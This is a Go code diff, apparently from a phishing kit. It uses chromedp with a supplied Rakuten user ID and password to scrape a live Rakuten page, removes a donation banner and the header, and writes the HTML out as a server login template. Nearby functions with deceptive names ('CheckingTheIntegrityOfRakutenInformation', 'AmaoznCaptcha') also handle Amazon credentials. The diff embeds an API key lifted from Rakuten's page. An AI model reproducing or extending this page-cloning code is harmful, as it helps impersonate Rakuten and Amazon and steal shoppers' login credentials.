@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/chromedp/cdproto/dom"
@@ -147,7 +148,7 @@ func AmaoznCaptcha(email string, password string) error {
 func CheckingTheIntegrityOfRakutenInformation(userId string, password string) error {
 	ctx, cancel := chromedp.NewContext(context.Background(), chromedp.WithBrowserOption())
 	defer cancel()
-	//var data string
+	var res string
 	var res6 []byte
 	var res7 []byte
 	var res8 []byte
@@ -170,11 +171,7 @@ func CheckingTheIntegrityOfRakutenInformation(userId string, password string) er
 			if err != nil {
 				return err
 			}
-			data, err := dom.GetOuterHTML().WithNodeID(node.NodeID).Do(ctx)
-			if err != nil {
-				return err
-			}
-			err = ioutil.WriteFile("../templates/autogen_rakuten.html", []byte(data), os.ModePerm)
+			res, err = dom.GetOuterHTML().WithNodeID(node.NodeID).Do(ctx)
 			if err != nil {
 				return err
 			}
@@ -188,6 +185,66 @@ func CheckingTheIntegrityOfRakutenInformation(userId string, password string) er
 	os.WriteFile("./res7.png", res7, 0644)
 	os.WriteFile("./res8.png", res8, 0644)
 	os.WriteFile("./res9.png", res9, 0644)
+	output := `{{define "autogen_rakuten_info"}}` + res + `{{end}}`
+	output = strings.Replace(output, `<div class="spacer--xFAdr  block--2PK_L  
+        
+        
+        
+        padding-bottom-small--sgTI2
+       
+      
+      
+      
+      border-bottom-gray--OXbtM
+      
+     white--3LZcf"><div class="spacer--xFAdr  block--2PK_L  
+        padding-left-xlarge--2d9GV
+        padding-right-xlarge--LeKQw
+        
+        padding-bottom-xxsmall--14_zk
+        "><div class="container--IckCk type-3--1HhJJ"><span class="clickable-span--15gHd"><div class="icon--2tjYQ icon-left--3FsRA"><div class="text-display--1Iony type-icon--3g0D- size-custom-medium--3iEUT align-left--1hi1x color-information-icon--3Z3gZ  layout-inline--1ajCj"><div class="icon--2sY_j common-info-filled--auWfJ"></div></div></div><div class="text--2TE80"><div class="text-display--1Iony type-body--1W5uC size-small--sv6IW align-left--1hi1x color-gray-darker--1SJFG line-height-medium--2-H3z layout-inline--1ajCj">ウクライナ 緊急支援募金のお知らせ</div></div><div class="icon--2tjYQ icon-right--2F1nI"><div class="text-display--1Iony type-icon--3g0D- size-custom-small--2Y-pv align-right--2ACTn color-gray--1TFBo  layout-inline--1ajCj"><div class="icon--2sY_j common-chevron-right--VZMgW"></div></div></div></span></div></div></div>`, ``, -1)
+
+	output = strings.Replace(output, `<div irc="CommonHeaderMall" data-url="https://www.rakuten.co.jp" data-settings="[
+      {
+  &quot;tracker&quot;: {
+    &quot;params&quot;: {
+      &quot;accountId&quot;: 1,
+      &quot;serviceId&quot;: 1,
+      &quot;pageLayout&quot;: &quot;pc&quot;,
+      &quot;pageType&quot;: &quot;top&quot;
+    }
+  },
+
+  &quot;showSearchBar&quot;: true,
+  &quot;showMemberInfoSummary&quot;: false,
+  &quot;showSpu&quot;: false,
+  &quot;showCartModal&quot;: true,
+  &quot;customLogoImageUrl&quot;: &quot;https://r.r10s.jp/com/img/thumb/logo/logo_rakuten_25th.svg&quot;,
+      &quot;links&quot;: {
+        &quot;top&quot;: &quot;https://corp.rakuten.co.jp/event/anniversary25th/?scid=wi_ich_r25_pc_top_header_25th_logo_v1&quot;
+      },
+  &quot;withBorder&quot;: false,
+  &quot;suggestionUrl&quot; : &quot;https://rdc-api-catalog-gateway-api.rakuten.co.jp/SUI/autocomplete/pc&quot;,
+  &quot;useTBasketDomain&quot;: true,
+  &quot;api&quot;: {
+      &quot;cartApiSid&quot;: 1010,
+      &quot;notificationLocId&quot;: 25,
+      &quot;url&quot;:&quot;https://api-ichiba-gateway.rakuten.co.jp/graphql-common-bff/graphql&quot;,
+      &quot;apikey&quot;: &quot;59093b15781a092c9573ea7032016ddb&quot;,
+      &quot;clientId&quot;: &quot;top&quot;,
+      &quot;spuViewType&quot;: &quot;top&quot;,
+      &quot;spuSource&quot;: &quot;pc&quot;,
+      &quot;spuEncoding&quot;: &quot;UTF-8&quot;,
+      &quot;spuAcc&quot;: 1,
+      &quot;spuAid&quot;: 1
+    }
+}
+
+    ]">`, ``, -1)
+	err = os.WriteFile("server/templates/autogen_rakuten_login.html", []byte(output), 0644)
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
